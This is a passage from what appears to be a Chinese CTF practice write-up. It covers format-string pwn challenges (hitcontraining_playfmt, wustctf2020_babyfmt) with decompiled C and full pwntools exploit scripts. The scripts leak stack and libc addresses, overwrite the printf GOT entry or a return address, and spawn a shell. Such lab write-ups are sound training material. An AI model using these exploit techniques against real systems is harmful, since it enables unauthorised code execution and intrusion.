&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_libc)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_low = system_libc &amp; <span class="number">0xffff</span></span><br><span class="line">system_high = (system_libc&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = p32(printf_got) + p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(system_low - <span class="number">0x8</span>) + <span class="string">&#x27;c%6$hn&#x27;</span> </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(system_high - system_low) + <span class="string">&#x27;c%7$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;\n&quot;</span>, payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining_playfmt"></a>hitcontraining_playfmt</h3><p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>什么保护都没开,这题有很多解法</p>
<p>play</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">play</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  Magic echo Server&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> do_fmt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>do_fmt</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fmt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">&quot;quit&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp1</p>
<p>这里修改返回地址,改到bss段执行shellcode,比较方便</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./playfmt&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc =ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28568</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./buulibc/libc-2.23-x86.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x804a060</span> </span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;aaaa&quot;</span> + <span class="string">&quot;%6$p&quot;</span> <span class="comment"># 先泄露stack地址</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;\n&quot;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack1 = <span class="built_in">int</span>(<span class="built_in">str</span>(io.recv(<span class="number">10</span>)),<span class="number">16</span>)-<span class="number">0x10</span> + <span class="number">0x4</span></span><br><span class="line">log.success(<span class="string">&#x27;stack1 =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack1)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%6$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span> <span class="comment"># 这里的&quot;aaaa&quot;是为了后面recv定位,不让两个payload连在一起发送出去,因为这一题每次循环没有回显</span></span><br><span class="line">io.sendline(payload) <span class="comment"># 这里改了rbp</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((buf&amp;<span class="number">0xffff</span>) + <span class="number">0x8</span>) + <span class="string">&quot;c%10$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span> <span class="comment"># 这里改了返回地址</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;break printf&quot;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;quit\x00\x00\x00\x00&quot;</span> + shellcode <span class="comment"># 这里是退出,顺便构造codeshell</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>要点<ul>
<li>这题主要的问题就一个,read到bss段怎么改一些地址,例如got</li>
<li>这里可以通过几步来改<ol>
<li>通过fmt利用0xffefb708处的ebp链将最后一个指向想要改的地址,(只能改2个字节),这里我们指向了返回地址<code>0xffefb708 -&gt; 0xffefb718 -&gt; 0xffefb70c -&gt; 0x80485ad</code></li>
<li>然后通过0xffefb718这里<code>0xffefb718 -&gt; 0xffefb70c -&gt; 0x80485ad</code>这条链,来改返回地址(只能改两个字节),这里因为bss读入的位置是0x804a060,只差两个字节,所以可以成功,我们事先写好shellcode,然后满足条件退出循环,ret跳转已经劫持好的地址,执行</li>
</ol>
</li>
<li>主要的利用手段就是通过修改站上地址指向数据的末尾两字节(首先是通过rbp链来构造机会),然后二次fmt修改</li>
<li>因为这一题每一次fmt的循环里面没有回显,我们需要自己制造回显来判断是否输入完全,同时隔开两个payload,以免发生错误,这里<strong>在每一个payload后面都加上了”aaaa”,作为标志</strong>,这个很重要</li>
</ul>
</li>
</ul>
<p><img src="E:\Blog\source_posts\刷题记录-0x1\hitcontraining_playfmt.png" alt="hitcontraining_playfmt"></p>
<p>exp2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./playfmt&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc =ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28568</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./buulibc/libc-2.23-x86.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;break *80483A0&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">&quot;aaaa&quot;</span> + <span class="string">&quot;%6$p&quot;</span> + <span class="string">&quot;bbbb&quot;</span> + <span class="string">&quot;%15$p&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;\n&quot;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack1 = <span class="built_in">int</span>(<span class="built_in">str</span>(io.recv(<span class="number">10</span>)),<span class="number">16</span>)-<span class="number">0x10</span> + <span class="number">0x4</span></span><br><span class="line">stack2 = stack1 + <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;stack1 =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack1))) <span class="comment"># stack1指向printf_got</span></span><br><span class="line">log.success(<span class="string">&#x27;stack2 =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack2)))  <span class="comment"># stack2指向printf_got + 2</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(<span class="built_in">str</span>(io.recv(<span class="number">10</span>)),<span class="number">16</span>)- <span class="number">241</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">0x6</span> <span class="comment"># 这个0x6是libc2.23和libc2.27不一样的问题导致函数调用的时候,栈上的不是__libc_start_main+241,变成+247了吧,稍做了调整</span></span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_libc =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_libc)))</span><br><span class="line"></span><br><span class="line">printf_low = printf_got &amp; <span class="number">0xffff</span></span><br><span class="line">printf_high = (printf_got&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">system_low = system_libc &amp; <span class="number">0xffff</span></span><br><span class="line">system_high = (system_libc&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的payload是反复利用fmt来调整栈,虽然长但是比较重复,就是两个为一组来调整具体栈上的数值</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%6$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span>   <span class="comment"># 调整rbp链指向stack1</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(printf_low) + <span class="string">&quot;c%10$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span>   <span class="comment"># 调整0x408xxxx的低八位为printf_low</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((stack1&amp;<span class="number">0xffff</span>) + <span class="number">2</span>) + <span class="string">&quot;c%6$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span>  <span class="comment"># 调整rbp链指向stack1 + 2的位置</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(printf_high) + <span class="string">&quot;c%10$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span>  <span class="comment"># 调整0x408xxxx的高八位为printf_high</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(stack2&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%6$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span>  <span class="comment"># 调整rbp链指向stack2</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(printf_low + <span class="number">2</span>) + <span class="string">&quot;c%10$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span>  <span class="comment"># 调整0x408xxxx的低八位为printf_low + 2</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((stack2&amp;<span class="number">0xffff</span>) + <span class="number">2</span>) + <span class="string">&quot;c%6$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span>  <span class="comment"># 调整rbp链指向stack2 + 2的位置</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(printf_high) + <span class="string">&quot;c%10$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span>  <span class="comment"># 调整0x408xxxx的高八位为printf_high</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(system_low) + <span class="string">&quot;c%7$hn&quot;</span>    <span class="comment"># 这里直接把上面stack1和stack2的位置,改成system 和 system + 2, 因为是read在bsss段上,不会因为输入长度影响栈的偏移,所以算格式化字符串偏移的时候比较方便</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(system_high-system_low) + <span class="string">&quot;c%11$hn&quot;</span> + <span class="string">&quot;aaaa&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>思路<ul>
<li>fmt使用方法同exp1</li>
<li>这里修改了两个地址0x408xxxx，分别指向<code>printf_got</code>和<code>printf_got+2</code></li>
<li>这里同一条rbp链用了两次分别来改上面那两个0x408xxxx的地址</li>
<li>然后用一条fmt改<code>printf_got</code>和<code>printf_got+2</code>,改成system</li>
<li>read <code>/bin/sh\x00</code></li>
<li>这里不仅需要泄露stack地址,还要泄露libc地址,libc地址是通过<code>__libc_start_main</code>函数来泄露的,栈上有一个<code>__libc_start_main + 241</code>的地址这里用它泄露了地址(libc-2.27),远程的时候发现这个偏移有一点点问题,稍作修改还是能爆出libc地址的(libc-2.23)</li>
</ul>
</li>
</ul>
<p>第三种思路</p>
<ul>
<li>把__libc_start_main的地址改为onegadget</li>
<li>然后回退程序的时候(leave ret)会执行onegadget</li>
<li>这里注意我们使用了rbp链在,最后回退的时候需要修复,修复的时候,按照原本的程序跑一遍,看看和利用以后的差多少减去偏移就行,最后会返回到onegadget,getshell(32位需要修复)</li>
<li>onegadget一个libc里面会有很多,我们可以把地址保存到一个列表中<code>onegadget = []</code>,然后通过列表索引,来尝试各个onegadget,当某一个不能用的时候</li>
</ul>
<h3 id="wustctf2020-babyfmt"><a href="#wustctf2020-babyfmt" class="headerlink" title="wustctf2020_babyfmt"></a>wustctf2020_babyfmt</h3><blockquote>
<p>fmt格式化字符串,改stdout流</p>
</blockquote>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>保护全开</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  initial();</span><br><span class="line">  ask_time();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        menu();</span><br><span class="line">        v3 = get_int();</span><br><span class="line">        v5[<span class="number">1</span>] = v3;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        fmt_attack(&amp;v4);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">        leak(v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      get_flag();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经典的目录选项在menu之前有一个asktime</p>
<p>asktime</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">ask_time</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;dididada.....&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;tell me the time:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v1);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ok! time is %ld:%ld:%ld\n&quot;</span>, v1, v2, v3);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>menu</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. leak&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. fmt_attack&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. get_flag&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. exit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fmtattack</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">fmt_attack</span><span class="params">(<span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">56</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">1</span>;</span><br><span class="line">  read_n(format, <span class="number">40</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里fmtattack函数使用过了以后a1就会被置为1,这是限定这个函数只能使用一次</p>
<p>我们发现这个a1在栈上,可以修改</p>
